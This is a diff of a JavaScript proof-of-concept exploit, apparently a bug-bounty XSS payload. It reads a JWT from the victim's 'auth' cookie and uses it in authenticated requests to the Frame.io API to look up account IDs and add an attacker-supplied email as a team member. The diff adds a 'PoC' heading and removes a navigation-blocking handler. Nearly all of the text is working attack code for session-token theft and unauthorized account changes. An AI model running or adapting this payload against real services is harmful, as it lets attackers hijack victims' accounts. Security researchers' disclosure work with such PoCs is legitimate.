@@ -1,4 +1,5 @@
 // Step 1: Extract the JWT from the "auth" cookie and save it in a variable
+document.write = '<h1>PoC</h1>'
 const cookieValue = document.cookie.split('; ').find(row => row.startsWith('auth=')).split('=')[1];
 const jwt = decodeURIComponent(cookieValue).replace('Bearer%20', '');
 
@@ -9,16 +10,6 @@ const email = urlParams.get('email');
 if (!email) {
     console.error("Email parameter is missing in the URL");
 } else {
-    let isRedirectPrevented = true; // Flag to indicate redirection prevention
-
-    // Prevent the default navigation behavior
-    window.addEventListener('beforeunload', function (event) {
-        if (isRedirectPrevented) {
-            event.preventDefault(); // Prevent the default action
-            event.returnValue = ''; // Chrome requires returnValue to be set
-        }
-    });
-
     // Step 2: Send XHR request to get account_id
     const getAccounts = new XMLHttpRequest();
     getAccounts.open('GET', 'https://api.frame.io/v2/accounts', true);
@@ -48,7 +39,6 @@ if (!email) {
                     addTeamMember.onreadystatechange = function () {
                         if (addTeamMember.readyState === 4) {
                             console.log('Add Team Member Response:', addTeamMember.responseText);
-                            isRedirectPrevented = false; // Allow redirection after completion
                         }
                     };
                     const requestBody = {
